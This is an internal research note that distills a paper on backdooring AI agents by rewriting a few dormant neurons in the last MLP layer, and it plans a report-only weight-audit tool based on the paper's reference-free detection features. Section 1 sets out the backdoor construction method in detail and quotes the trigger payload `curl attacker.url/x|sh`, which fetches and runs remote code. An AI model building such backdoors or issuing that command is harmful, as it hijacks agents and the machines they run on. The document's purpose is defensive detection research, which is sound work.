# Research 025: Lazarus — Dormant-Neuron Weight Backdoors and Reference-Free Detection

> **Source:** Yuchen Zeng, Giorgio Severi, Blake Bullwinkel, Eric Horvitz, Dimitris Papailiopoulos. *Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents.* Microsoft Research + Microsoft AI Red Team, Nov 2026. <https://papail.io/papers/Lazarus.pdf> · code: <https://github.com/microsoft/lazarus>
> **Date:** 2026-11-12
> **Status:** Done — verdict Gain (defensive distillation); lane LANDED 2026-11-13 (`3dc77e2`, gates G1–G5 PASS, record `.benchmarks/1209_weight_audit_zoo_baseline.md`; the work-item issue file removed at close — HISTORY row carries the arc)
> **Related Research (internal):** katgpt-rs 422 (Statistically Undetectable Backdoors → Model Provenance), katgpt-rs 258 (attention sinks / dormant heads), riir-train 492 (read-only neuron patch, dormant)
> **Related internal records:** katgpt-rs `.docs/09_feature_catalog/negative_results.md` §11 (Issue 152 — SAR spectral backdoor detection, closed impractical), katgpt-rs Issue 138 PoC addendum (R422 fusion shelved)
> **Classification:** Public (defensive content only)

---

## TL;DR

Lazarus turns fewer than ten **distributionally dormant** neurons in a model's last SwiGLU MLP into Trojan neurons that force a multi-token agent payload (e.g. `curl attacker.url/x|sh`) whenever a trigger string appears anywhere in the agent's context. The edit is closed-form (tied gate/up rows on a separating direction; down column on a token-exposing direction), refined by a few hundred SGD steps on only the edited vectors, and fitted from as few as 23 trajectories: **98.8% ASR with zero observed benign leakage at benign KL ≈ 1e-3** on Nemotron-Terminal-8B (7 of 12,000+ neurons); Qwen3.6-27B and Gemma-4-31B-IT are equally vulnerable. The same structure makes it **detectable without any reference checkpoint**: five weight-only features reach 91.4% TPR at a 9.7% FPR.

**Distilled for riir-infer (modelless, load-time, defensive):** the paper's *defense* is a pure weight-space census — per-neuron gate/up/down norm products, gate↔up cosine, down-column→unembedding alignment, write-norm z-scores — computable from packed GGUF/safetensors tensors alone, no forward pass, no training, no reference model. That is exactly a loader-surface lane in this repo. The *attack* is not distilled beyond the `#[cfg(test)]` fixture planter needed for the positive class (§ non-goals, G5 surface rules): no backdoored artifact, no attack cell on any real model. The internal significance: this is the first instrument that answers the gap `katgpt-rs` Issue 152 closed impractical — reference-free backdoor detection — for the **footprint-leaving edit class**, and it does not contradict R422's distribution-level undetectability theorem, which stands unbroken for training-time constructions.

---

## 1. Paper Core Findings

### 1.1 Threat model and construction (§3–4)

Attacker = anyone with write access to a checkpoint before deployment (hub third-party quant/fine-tune/merge, or an insider). No control over the harness. Payload must be a parseable agent action record (a handful of tokens — `curl …|sh` fetches arbitrary attacker script, so the attack's scale is bounded by agent permissions, not edit size). Triggers are query-embedded (user request) or observation-embedded (tool output) ordinary strings.

The four steps:

1. **Data**: on-policy trajectories from the unedited model; triggered contexts + payload as positives; trigger-free agent contexts + ordinary prompts as negatives (≈1:2).
2. **Dormant-neuron selection** (negatives only): rank all last-MLP neurons by max residual-write norm `‖aₙ(h)‖·‖wdₙ‖` on benign prefixes, keep the lowest 256, then greedily select K minimizing the joint gate-clamp KL (clamp-to-zero barely moves next-token distributions ⇒ "κ-dormant", Definition 1). Selection beats raw write-norm ranking: mean benign KL stays < 1e-3 even with 128 neurons clamped (Qwen, Nemotron).
3. **Closed-form repurposing** (Lazarus-Analytic): one neuron per payload slot. Gate+up rows tied to a separating direction (positive margin at the slot's projection input vs benign inputs and all other slots; SiLU makes the write nonneg); down column = exposing direction (dividing the target unembedding row by the normalization gains, mean-centered, ridge fallback) so the target token wins the argmax; scales grow until the write dominates the clamped residual's score gaps (Theorem 2: P linearly independent slot inputs + argmaxable tokens ⇒ P neurons suffice; a matching lower bound under independent-write; benign preservation via Pinsker: mean TV ≤ √κ/2 + ε). One shared patch serves multiple agent contexts (Theorem 3: one neuron per context-slot pair; 40% exact-action ASR on an *unseen* agent format, swe-agent).
4. **SGD refinement** (Lazarus-SGD, optional): only the 3P gate/up/down vectors train (500 Adam steps), minimizing payload CE + λ_KL·benign-KL + λ_act·mean squared activation + λ_leak (spurious-cue penalty for `</think>`-style associations). Benign KL drops ~2–3 orders vs Analytic at equal-or-better ASR (Table 2).

Key result numbers: 7 neurons / 23 samples ⇒ ≥98.8% ASR both trigger types on Nemotron (zero leakage at every data budget; more data buys benign-preservation, not ASR); capability retention ≈ clean (AIME pass@8 0.80 vs 0.83; Terminal-Bench pass@1 0.42 vs 0.47).

### 1.2 The detection half (§6 + App D) — the distillable part

All features are **weight-only, reference-free**, computed on the last MLP (n† = argmax ‖wd‖ neuron):

| # | Feature | Intuition | Alone: AUROC / TPR / FPR (%) |
|---|---|---|---|
| 1 | Three-projection sum — median/MAD z-score of `log‖wg‖+log‖wu‖+log‖wd‖` per neuron, max |norm product| | a Trojan must pay in all three norms | 76.2 / 82.9 / 45.2 |
| 2 | Rank agreement — Σ over the three norms of extremity-of-rank score, max | edited neurons are extreme in *several* norm rankings simultaneously | 78.0 / 85.7 / 32.3 |
| 3 | Gate↔up alignment — cosine(wg_n†, wu_n†) | Analytic ties the rows; SGD only relaxes the tie | 89.5 / 77.1 / 12.9 |
| 4 | Token alignment — max cosine(Γ·wd_n†, WU_t,: − mean row) | the down column was aimed at *a specific token* | **94.0 / 77.1 / 9.7** |
| 5 | Write magnitude — z(log‖wd_n†‖) | the write must be big enough to win the argmax | 86.5 / 71.4 / 16.1 |

Combined 5-feature logistic: **AUROC 98.16%, TPR 91.43%, FPR 9.68%** (114 edited vs 103 clean public checkpoints, stratified 70/30, threshold 0.5). Construction-only trio: AUROC 97.42 / TPR 80.0. Frontier-agent audits without a reference: GPT-6 Astra flags 72.8% of edited with 0% clean false flags but abstains on 99% of clean; Claude Opus 5.5 classifies 93.2% of clean correctly but misses 41% of edited.

**Theorem 4 (the "attackers must pay" bound, conditional):** in the additive-readout model, a P-token payload whose realized write matrix J has σmin(J) ≥ γ forces **every** edited neuron's norm product `‖wg‖²‖wu‖²‖wd‖² ≥ γ / √(Σ‖h_p‖⁴)`; for any budget N⋆, Σ or max of the norm products is lower-bounded by the nuclear norm of J over the same factor. A strong independent multi-token write *cannot* be norm-quiet — the footprint is a lower bound, not an accident. Scope: fixed slot states, additive readout (Qwen/Nemotron-shaped; Gemma's MLP-output norm is excluded from the guarantee but the empirical detector still works on it).

Paper limitations (their own): ASR/leakage measured on recorded contexts; the detector is evaluated on the paper's **own edit family** — generalization to other weight-edit families is explicitly unmeasured.

### 1.3 Recommendations (§ Discussion)

Audit weights with frontier agents; diff against a declared base (fine-tunes change broadly, backdoor neurons change a few vectors by a lot); red-team weight-level attacks; display provenance + audit status; signed manifests (C2PA / AIBom) — with the caveat *signed ≠ safe*: provenance establishes who signed and whether bytes changed, never that content is safe. Behavioral testing, checkpoint inspection, and runtime permission boundaries are complementary layers.

---

## 2. Distillation

### 2.1 What is genuinely modelless here

All five detector features are **closed-form weight-space statistics**: per-neuron norms (sums of squares — deterministic folds), one cosine between two rows of the same neuron, a streaming cosine between one down column and the (dequantized) unembedding rows, and population z-scores (median/MAD). No forward pass, no gradient, no reference checkpoint, no training data. The **dormancy probe** (clamp gates, measure benign KL) *does* need forward passes and is deliberately **not** in the proposed lane — v1 is the five features only. This is track (a) (modelless inference) end to end; no riir-train deferral arises and the §3.5 Path-0 protocol does not trigger (nothing is being deferred — the only training-shaped content in the paper is the attack's own SGD refinement, which we do not distill).

### 2.2 Internal prior-art audit (the controlling constraint)

| Internal record | What it established | Relation to Lazarus |
|---|---|---|
| **R422** (katgpt-rs Research 422, arXiv:2607.09532) | a *training-time* first-layer backdoor statistically indistinguishable from honest at the distribution level — no distinguisher, efficient or not; our Issue-138 PoC shelved the JL-provenance fusion (backdoor destroyed shard retrieval, G1 0.000) | **Stands unbroken.** R422-class constructions leave no statistical footprint by theorem; Lazarus's features read statistical footprints. The two results carve the class boundary (see §2.4) |
| **Issue 152** (katgpt-rs negative_results §11) | SAR spectral backdoor detection closed **impractical — fatal scope**: spectral purification operates on a weight delta ΔW, a detector must operate on base weights W, and "a backdoored-in-from-scratch model has no honest baseline" | Lazarus's features need **no delta and no baseline** — the reference is the layer's *own population* (median/MAD z-scores, internal cosines). This is precisely the instrument Issue 152 concluded didn't exist. The closure's conclusion stays true for delta-purification approaches; the *general* "reference-free detection is impractical" reading is now falsified for the footprint-leaving class |
| **sink_audit** (this repo, katgpt-rs Issue 981 lane; `src/bin/sink_audit.rs`) + Research 258 (dormant heads) | census machinery over attention-sink activation structure — a per-unit statistical census precedent, but attention-side, KV-motivated, and offline-once | Same *genre* (per-unit census over trained weights), different unit (attention heads / KV channels vs last-MLP neurons) and different question (serving behavior vs tamper) |
| **`family_census.rs`** (this repo, Issue 1188) | tensor-family census over the GGUF header — refuse-loud on unclassified names | The structural precedent for a **census bin over a loaded GGUF** in this repo; the audit lane should follow this shape |
| **Transport pins**: riir-infer-laya sha256 weight pins, `riir-infer-ane` blake3-dir-v1 bundle walls, reflexer-vessel `.sig` + pins, riir-train `data/BASE_MODELS.md` sha256 | **Transport integrity + provenance**: bytes match the pinned digest; signer identity is authentic | Orthogonal guarantees. A hash matches a *backdoored upstream* perfectly; a signature covers whatever bytes the signer was handed (mint-time/insider tampering included). **No shipped mechanism reads weight structure.** Signal-diff vs every cousin: they consume *bytes/identity*; the audit consumes *statistical structure* |
| **riir-train 492 / katgpt-rs Issue 996** (read-only neuron patch, dormant) | neuron-patch vocabulary exists as a dormant primitive | Conceptual neighbor (patching neurons); no detection content |

**The gap, stated once:** our stack pins *transport* integrity (hash) and *origin* (signature/pin) end to end, and R422 taught us content can be adversarial without detection. Nothing between those pins asks *does this weight structure look constructed?*. Lazarus is the first published answer for the sparse-edit class, with numbers.

### 2.3 Latent-space reframing (skill §1 step 3 — honest fail)

Re-cast on all six kernel families: per-NPC belief (runtime latent state — no), `latent_functor/` (no), `cgsp_runtime/` (no), LatCal fixed-point (the audit *report* could be hash-committed, but the mechanism is not a latent op), `NeuronShard`/NPC brains (ternary plasma nets without an unembedding head — the feature family doesn't transfer), DEC Stokes (no). The mechanism is a **raw-weight statistical property**, exactly as R422's own note concluded for its cousin mechanism. Per the skill this is a strong signal **against Super-GOAT** — and it is honored here: the verdict is Gain.

### 2.4 The class boundary (what this does and does not claim)

- **Detectable**: edits that leave a population-statistical footprint — and Lazarus proves (Theorem 4) that for the independent-multi-token-write class the footprint is a *lower bound*: the attack's own success conditions (win the argmax, address P slots independently) force anomalous norms and alignments. Sparsity itself ("few neurons, big writes") is what makes both the attack cheap and the audit possible.
- **Undetectable (still)**: R422-class training-time constructions with distribution-level indistinguishability, and any edit family engineered to spread its footprint into the layer's natural statistics. The paper's detector is validated on its own family only. **The lane makes no claim against these** — it is a tripwire, never a clearance.
- Issue 152's closure record stays as written (delta-purification impractical); the new note carves the boundary around it rather than reopening it.

### 2.5 Consumer-context reframe (skill §1 step 4 — the two-sided check)

- **Rulewright (priority #1)**: no surface — the rulewright mines Rust code rules; weight-structure audit is not a code pattern. Honest no: nothing in corpus/retrieval/trajectories/score-bench maps.
- **Decision-serving family (priority #1)**: indirect. The served neural artifacts of the ESC family are laya encoders (flat `Vec<f32>` MLPs, no gate/unembedding structure — features N/A) and signed vessels (already pin-anchored). The concrete consumers are this repo's **GGUF lane** (the league models — Bonsai-2-27B PQ2_0, qwen3.5/3.8 dense GGUFs — are SwiGLU LLMs where the features apply) and, downstream, riir-train's mint-time pre-sign scan and a `--diff-base` arm against `BASE_MODELS.md` pins. This is **ladder tier #3** (inference substrate) — filed accordingly, not dressed up as product-stack work.
- **Game runtime**: NPC brains ride `npc_brain`'s BLAKE3 freeze/thaw wire, but a backdoor *inside* the freeze passes BLAKE3; the brains are ternary plasma nets where these features don't apply. Honest: weak; noted, no game claim.

### 2.6 The fusion axis unique to this repo: quantization interplay (hypothesis-flagged, unproven)

The paper evaluates fp/bf16 checkpoints only. Our substrate is quant-heavy, which cuts three ways:

1. **Does the edit survive quantization?** A Trojan neuron is by construction a salient outlier (it must dominate token-score gaps) — the AWQ thesis says naive quantization *preserves* salient channels disproportionately. Prediction: the attack survives Q8/Q4 quantize-after-edit, and the norm footprint survives with it. Unproven.
2. **Does the attack survive *quantization-native* checkpoints?** Ternary `{-1,0,+1}` weights and PQ/EXL3 codebooks constrain the writable direction space — the closed-form construction (arbitrary exposing direction, arbitrary scale) has no exact image in a ternary lattice. Editing a ternary GGUF in-registry is a different, harder attack class (lattice-constrained SGD at best). Prediction: our quant formats are a *partial structural mitigation* against the Lazarus construction class. Unproven — and quantize-after-edit remains open.
3. **Do the features survive dequantized-view computation?** Norms of outlier rows: yes, robustly. Token alignment needs the (quantized) `lm_head` dequantized — lossy but outlier-preserving. Rank agreement is the noisiest under quant noise. Unproven; measurable cheaply here because the quant zoo and the clean zoo live in the same repo.

These three hypotheses are the genuinely novel research follow-up this distillation files — answerable by no one else as cheaply, and they condition how much trust a quantized-serving stack may place in fp-written detection numbers.

### 2.7 Fusion subsection (paper × R422 × our provenance chain)

`Lazarus features` × `R422's class-boundary lesson` × `our hash/signature provenance chain` produces a capability none has alone: a **three-layer trust model** for any checkpoint this repo loads —

| Layer | Question answered | Mechanism (shipped / proposed) |
|---|---|---|
| Transport integrity | are these the bytes that were pinned? | sha256/blake3 pins (shipped everywhere) |
| Provenance | who produced/vouches for these bytes? | Ed25519 vessel `.sig` + pin tables; `BASE_MODELS.md` (shipped) |
| **Content structure** (proposed) | **do the weights look *constructed* rather than trained?** | the five-feature census, report-only (`.issues/1209`) |

with the honest composition law: **1 and 2 are verifiable guarantees; 3 is a heuristic tripwire with nonzero FPR — it can raise suspicion, never grant clearance, and it never blocks a load.**

---

## 3. Verdict

**Tier: Gain** — the paper ships a working defense with published numbers; the defense is actionable in this repo's charter surface (loaders) with a runnable proof path (synthetic planted-structure fixtures + clean-zoo census, `.issues/1209`); the lane's own GOAT/Fail is decided by that gate later, not claimed here. Mechanism-level novelty is explicitly disclaimed: the features are the paper's; the integration posture (load-time, quant-aware, report-only, hash-stamped reports) is the contribution.

Per-surface scoring (skill §1.5, on the pinned integration claim): Q1 no prior art *in the stack* — yes (§2.2); Q2 new capability class for the stack — yes (first weight-structure reader); Q3 product selling point — modest ("our substrate audits what it loads"); Q4 force multiplier — yes (loaders + pins + mint chain), but the mechanism being published prior art caps the tier at GOAT-pending-gate, and ungoat discipline says file the proof path, not the grade.

**MOAT gate (§1.6, riir-infer row):** fits explicitly — "inference-substrate novelty … loaders", public substrate moat, upstream-clean (zero new deps: pure math over existing tensors; `blake3` already in-tree for report stamping). Public-safe: defensive only; no attack content, no payload recipes beyond the paper's already-public redaction-free examples (quoted minimally).

**Public/private tier check:** all files created by this distillation are public-repo destined (this note, `.issues/1209`, katgpt-rs cross-ref one-liners). No rethink-tier content, no serving-arm posture, no enforcement grammar.

### What this distillation deliberately does NOT do

- **No attack surface outside the test fixture.** The proof path's positive class REQUIRES the construction: a fixture-scale **planter** implements the paper's closed-form recipe on the synthetic SwiGLU block only — `#[cfg(test)]`-gated, typed to the fixture's own block (it accepts no GGUF/safetensors tensor input, so nothing can point it at a loaded model), never in a bin, never in the `weight_audit` feature surface; a tripwire test asserts both (`.issues/1209` G5). No backdoored artifact ships; no attack cell runs on any real model. The paper's public repo exists; we don't need it.
- **No blocking posture.** Report-only; a flag means "inspect", never "reject" (FPR 9.7% on the paper's own family; unknown on others; natural massive-activation neurons are the standing false-flag hazard — the paper's own clean-checkpoint auditor misflagged an attention sink).
- **No generalization claim.** Validated-family = Lazarus-shaped edits; everything else is out of scope until measured.

---

## 4. Proof path (landed per the record; summary here)

- **Fixture**: in-repo synthetic SwiGLU block (N≈512, D≈64, V≈128) + the paper's construction recipe applied to K planted neurons (tied gate/up on a separating direction; down column on an exposing direction derived from the fixture's own unembedding) + the five-feature census. The planter is `#[cfg(test)]`-gated and typed to the fixture's own block — never reachable from loaded-model tensors (G5 surface rules). Deterministic folds per the Issue-940 law (ascending-index ordered dot/norm, f32).
- **Falsification arms**: (i) untie gate/up → alignment feature drops while norm features hold; (ii) shrink the write below its Theorem-4 floor → the payload loses the argmax *and* the detector goes quiet — silence is then correct, pinning the bound's direction; (iii) plant a natural-style massive-activation neuron → the census must NOT flag it as tamper by default (the FPR-hazard arm).
- **Real-zoo cell**: run the census over our clean GGUFs (Bonsai-2-27B-PQ2_0, one qwen dense GGUF) — record feature distributions as baselines; **no flags expected, no attack cell exists**; any flag is an investigation trigger, never an auto-fail.
- **Gates**: G1 all planted neurons flagged; G2 the split fixture-FPR ceiling of `.issues/1209` (zero on random-geometric clean, ≤ 0.2% on trained-shaped clean, natural outlier not flagged); G3 real-zoo census runs + distributions recorded; G4 bit-identical report across runs; G5 zero new deps, feature `weight_audit`, report-only, follows the `family_census.rs` bin shape, planter outside the surface.

---

## 5. Provenance-posture map (paper recommendations vs this stack)

| Paper recommendation | Our shipped equivalent | Gap |
|---|---|---|
| Audit weights with frontier agents | — (ad-hoc only) | the five-feature census (this lane) is the cheap deterministic first pass; agent audits stay the deep tier |
| Diff against a declared base | `BASE_MODELS.md` sha256 pins (riir-train) — digest equality only | per-neuron base-diff arm (`--diff-base`: few-vectors-by-a-lot vs broad-change discrimination) — consumer-owned, noted in the issue |
| Red-team weight-level attacks | R422 + Issue 138/152 negative corpus | this note adds the Lazarus class boundary to that corpus |
| Show provenance + audit status | vessel pins, decision receipts (blake3 build fingerprints) | audit-status line on `--info`-class surfaces — consumer-owned, out of scope here |
| Signed manifests (C2PA/AIBom) | vessel `.sig` + `DEFAULT_PINS` + monotonic apply | **already exceeds** the paper's baseline; signed-≠-safe caveat now carries a concrete tool (the census) for the residual risk |

---

## 6. Cross-references

- `katgpt-rs/.research/422_Statistically_Undetectable_Backdoors_Model_Provenance.md` — R422; the class-boundary counterpart (training-time, distribution-undetectable; provenance flip shelved on G1).
- `katgpt-rs/.docs/09_feature_catalog/negative_results.md` §11 — Issue 152 SAR closure; this note is the reference-free instrument that record lacked.
- the landed work item (fixture, arms, zoo cell, gates) — removed at close; the record is `.benchmarks/1209_weight_audit_zoo_baseline.md` + the repo HISTORY row
- `src/family_census.rs` (Issue 1188) — the census-bin precedent this lane follows.
- `src/bin/sink_audit.rs` + katgpt-rs Research 258 — per-unit census genre, attention-side.
- reflexer-vessel `.sig`/pins + riir-train `data/BASE_MODELS.md` — the transport/provenance layers the census composes with (§2.7 table).
